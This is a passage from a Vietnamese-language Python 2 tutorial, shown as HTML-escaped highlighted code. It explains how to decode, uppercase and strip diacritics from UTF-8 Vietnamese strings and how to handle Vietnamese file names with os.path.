&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;UnicodeDecodeError&lt;/span&gt;: &lt;span class="n"&gt;&amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xc3 in position 3: ordinal not in range(128)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hai cách để cộng đúng là:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;ss.decode(&amp;#39;utf8&amp;#39;) + u&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;hoặc&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;unicode(ss, &amp;#39;utf8&amp;#39;) + u&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các thao tác với chuỗi khác như &lt;tt class="docutils literal"&gt;join&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;split&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;find&lt;/tt&gt;... cũng tương tự. Nghĩa là nếu có một tham số unicode thì các tham số còn lại được tự động chuyển sang unicode trước khi thực hiện thao tác. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[u&amp;#39;sky&amp;#39;, u&amp;#39;down&amp;#39;, u&amp;#39;no&amp;#39;, u&amp;#39;enemy&amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sky&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;down&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;enemy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;unichr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;sky down no enemy&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Tương tự thao tác sau sẽ gây lỗi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;UnicodeDecodeError&lt;/span&gt;: &lt;span class="n"&gt;&amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xc3 in position 3: ordinal not in range(128)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để chuyển một chuỗi tiếng Việt utf sang dạng viết hoa, bạn luôn luôn phải chuyển nó về unicode trước. Nghiên cứu ví dụ sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;THI\xc3\xaaN H\xe1\xba\xa1 V\xc3\xb4 \xc4\x91\xe1\xbb\x8bCH&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;thi\xc3\xaan h\xe1\xba\xa1 v\xc3\xb4 \xc4\x91\xe1\xbb\x8bch&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;&amp;lt;/sourcecode&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So sánh với &lt;tt class="docutils literal"&gt;s&lt;/tt&gt; ta thấy &lt;tt class="docutils literal"&gt;s.upper()&lt;/tt&gt; không upper case được các ký tự &lt;tt class="docutils literal"&gt;ê&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;ạ&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;ô&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;đ&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;ị&lt;/tt&gt;...&lt;/p&gt;
&lt;p&gt;Để upper một chuỗi utf bạn phải chuyển nó về unicode trước, upper xong thì chuyển ngược lại. Hàm Upper sau nhận đầu vào là chuỗi utf, upper nó và trả về utf khác đã được upper, hàm này thích hợp cho mục đích upper tiếng Việt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Upper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;utf8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;us&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;Upper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;Upper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;us&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Kết quả:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
THIêN Hạ Vô địCH
THIÊN HẠ VÔ ĐỊCH
THIÊN HẠ VÔ ĐỊCH
&lt;/pre&gt;
&lt;p&gt;Đầu vào thích hợp của Upper là ascii, utf8, unicode, các dạng khác có thể sai: latin1, tcvn... Tương tự như vậy cho hàm lower, và capwords. Xem xét ví sau với capwords:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;

&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;capwords&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;capwords&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Kết quả:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Thiên Hạ Vô địch
Thiên Hạ Vô Địch
&lt;/pre&gt;
&lt;p&gt;Các tên file hoặc tên thư mục là tiếng Việt có dấu cũng đòi hỏi cách xử lý đặc biệt. Giả sử bạn có thư mục &lt;tt class="docutils literal"&gt;abc&lt;/tt&gt; với một file duy nhất tên là: &lt;tt class="docutils literal"&gt;tiếng việt.txt&lt;/tt&gt;. Thư mục &lt;tt class="docutils literal"&gt;abc&lt;/tt&gt; đặt trong thư mục cá nhân của bạn. Nghiên cứu đoạn chương trình sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expanduser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;basename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Chú ý:&lt;/strong&gt;&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Trên Windows &lt;tt class="docutils literal"&gt;path = &lt;span class="pre"&gt;&amp;quot;C:\Documents&lt;/span&gt; and Settings\YourAccountName\abc&amp;quot;&lt;/tt&gt;&lt;/li&gt;
&lt;li&gt;Trên Linux &lt;tt class="docutils literal"&gt;path = &amp;quot;/home/YourAccountName/abc&amp;quot;&lt;/tt&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vì chỉ có duy nhất một file &lt;tt class="docutils literal"&gt;tiếng việt.txt&lt;/tt&gt; trong thư mục &lt;tt class="docutils literal"&gt;abc&lt;/tt&gt; nên chúng ta mong đợi kết quả in ra là: &lt;tt class="docutils literal"&gt;[True]&lt;/tt&gt;. Tuy nhiên chỉ Linux cho câu trả lời này. Windows thì không. Không tin bạn thử xem. Chương trình trên cho dù đã được viết với việc tận dụng thư viện sẵn có &lt;tt class="docutils literal"&gt;os&lt;/tt&gt; nhằm nâng cao tính khả chuyển nhưng vẫn không khả chuyển, khi tên file là tiếng Việt có dấu.&lt;/p&gt;
&lt;p&gt;Giải quyết vấn đề này rất đơn giản bạn chỉ cần thay &lt;tt class="docutils literal"&gt;&amp;quot;abc&amp;quot;&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;u&amp;quot;abc&amp;quot;&lt;/tt&gt; để tất cả các đường dẫn tên file bị ép chuyển sang unicode là OK. Bạn làm như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expanduser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;hoặc&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expanduser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các vấn đề tương tự cũng áp dụng cho hàm &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt;, Các hàm này cần các đường dẫn là chuỗi unicode để có thể lấy chính xác các file có tên tiếng Việt.&lt;/p&gt;
&lt;p&gt;Loại bỏ dấu tiếng Việt. Trong nhiều trường hợp bạn cần loại bỏ dấu của một chuỗi tiếng Việt có dấu. Chẳng hạn chuyển &lt;tt class="docutils literal"&gt;tiếng việt&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;tieng viet&lt;/tt&gt;. Đây là một cách thức đơn giản giải quyết vấn đề này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="n"&gt;INTAB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ạảãàáâậầấẩẫăắằặẳẵóòọõỏôộổỗồốơờớợởỡéèẻẹẽêếềệểễúùụủũưựữửừứíìịỉĩýỳỷỵỹđ&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;INTAB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ch&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INTAB&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

&lt;span class="n"&gt;OUTTAB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;o&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;e&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;u&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;i&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;y&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;|&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INTAB&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;replaces_dict&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INTAB&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;OUTTAB&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;khongdau&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;utf8_str&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;replaces_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)],&lt;/span&gt; &lt;span class="n"&gt;utf8_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;khongdau&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;khongdau&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;khongdau&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;THIÊN HẠ VÔ ĐỊCH&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Kết quả:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
thien ha vo dich
sky down no enemy
THIÊN HẠ VÔ ĐỊCH
&lt;/pre&gt;
&lt;p&gt;Test thứ ba cho thấy nó chưa làm việc với chữ hoa. Một chút cải tiến nhỏ để nó làm việc với chữ hoa các bạn có thể thêm vào dễ dàng. Chương trình này chưa được test kỹ về sự chính xác và về performance. Các bạn tự test và công bố kết quả nhé.&lt;/p&gt;
&lt;p&gt;Slice với chuỗi tiếng việt dạng utf8 có thể gặp các vấn đề. Thao tác tương tự khi bạn đọc các khối dữ liệu utf8 với kích thước quy định trước từ file utf8. Xem xét các ví dụ sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;thiên hạ vô địch&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;thi\xc3\xaan h\xe1\xba\xa1 v\xc3\xb4 \xc4\x91\xe1\xbb\x8bch&amp;#39;&lt;/span&gt;
